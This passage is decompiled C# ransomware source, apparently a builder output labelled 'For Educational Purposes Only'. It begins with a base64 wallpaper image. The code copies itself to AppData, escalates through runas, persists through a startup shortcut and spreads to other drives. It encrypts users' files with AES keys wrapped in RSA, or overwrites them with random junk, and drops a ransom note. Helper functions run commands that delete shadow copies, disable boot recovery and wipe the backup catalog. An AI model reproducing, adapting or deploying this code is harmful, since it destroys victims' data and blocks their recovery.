X/ot3xq/8NBpn/zSVwfiT9jLQYf+CjHh/wCCOh+MPEWpeGfEviXRdE0/xXe+Dp7G9u7PUvspj1GLSvOeZ4njuVmgj8wSTxGI4jaTYvz/ABF4hZjxBh1hcbOLjF82itrZrXWz0b9Om7ObEcJ5jw/KGNxVCVNX0ctrrX9Ln3N/w6b0P/o8n9hb/wAO1H/8j0f8Om9D/wCjyf2Fv/DtR/8AyPXG/wDDh74U/wDRwXxC/wDDU2f/AMvqP+HD3wp/6OC+IX/hqbP/AOX1fmP1jK/+fi+87v8AiaCX/QbS/wDATsv+HTeh/wDR5P7C3/h2o/8A5Ho/4dN6H/0eT+wt/wCHaj/+R643/hw98Kf+jgviF/4amz/+X1H/AA4e+FP/AEcF8Qv/AA1Nn/8AL6j6xlf/AD8X3h/xNBL/AKDaX/gJ2X/DpvQ/+jyf2Fv/AA7Uf/yPR/w6b0P/AKPJ/YW/8O1H/wDI9cb/AMOHvhT/ANHBfEL/AMNTZ/8Ay+o/4cPfCn/o4L4hf+Gps/8A5fUfWMr/AOfi+8P+JoJf9BtL/wABOy/4dN6H/wBHk/sLf+Haj/8Akej/AIdN6H/0eT+wt/4dqP8A+R643/hw98Kf+jgviF/4amz/APl9R/w4e+FP/RwXxC/8NTZ//L6j6xlf/PxfeH/E0Ev+g2l/4Cdl/wAOm9D/AOjyf2Fv/DtR/wDyPXzv8RNAt/h3/wAF2PAOjaD410P4pWPhrxr4M0zSPEfgvUbrWLfW7e2TTYbZ7ZxdmTz/AC440a3gulSGZXhgeOOOPb6t/wAOHvhT/wBHBfEL/wANTZ//AC+r2GL/AINwtJ/ZT+Pfw78ReH/2ivD/AIq1Dw0LDxzqlnqPg5EtNKtorizlhS4khu722k8xZC2351dVRUWZriCOXanisBCEp0p30t9+x85xV42UuIcunTxOJhOFPW0VZ8zTSXdt66ereibXqdFFFfmZ/AQUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAV+Pnj3/k/Dxp/2NOs/wDo64r9g6/Hzx7/AMn4eNP+xp1n/wBHXFfUcNf8vv8ACf0f9GP/AJKun/jo/wDpxHodFFFegf66hRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABXnngL/k/DwX/wBjTo3/AKOt69DrzzwF/wAn4eC/+xp0b/0db12YT7f+Fn4b9IT/AJJV/wCP/wBx1D9g6KKK/Oz/ABtCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAK/Hzx7/wAn4eNP+xp1n/0dcV+wdfj549/5Pw8af9jTrP8A6OuK+o4a/wCX3+E/o/6Mf/JV0/8AHR/9OI9Dooor0D/XUKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAK888Bf8n4eC/wDsadG/9HW9eh1554C/5Pw8F/8AY06N/wCjreuzCfb/AMLPw36Qn/JKv/H/AO46h+wdFFFfnZ/jaFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAV+Pnj3/k/Dxp/wBjTrP/AKOuK/YOvx88e/8AJ+HjT/sadZ/9HXFfUcNf8vv8J/R/0Y/+Srp/46P/AKcR6HRRRXoH+uoUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAV554C/wCT8PBf/Y06N/6Ot69DrzzwF/yfh4L/AOxp0b/0db12YT7f+Fn4b9IT/klX/j/9x1D9g6KKK/Oz/G0KKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAr83o/i34L+B/8AwWk+KXiD4zReOpvB/wDwlnjXTPESeDbi4g1vN7HqdlmA3ssUpxNcKXS8fLxh1mSXc8b/AKQ16xrH/BDb9nz4qfFPxl8SPH3h3T5X8UeIE1+NLrxFr15/wlP9rzW19YwWQjkjv2knzfwTXL2z4+cxwvJFK0P0/DeIhSlU503e3bz3u1ofsng9nscrxNeu1K/uWcbe6480uZtt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AUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAf/2Q==";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[6] { "This is For Educational Purposes Only!", "", "This Ransomware can affect your system.", "", "-cybn", "" };

	private static string[] validExtensions = new string[2] { ".txt", ".jar" };

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>x8N3+0ShnIIQyQKeheVVGYTEiK0IZD3SH6LbWdn5MbZAD/wuJPIt2GX0nz6dlkuESx9/QDfo+oieOsGO+8Q2jqR1lFoaatykGsCqLmLgKcMZAndXah3tt8mcfQ/JrpHj+IFjVEnNtrJ8F003VcOg0MHpwzIZims7SQProMgzshU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
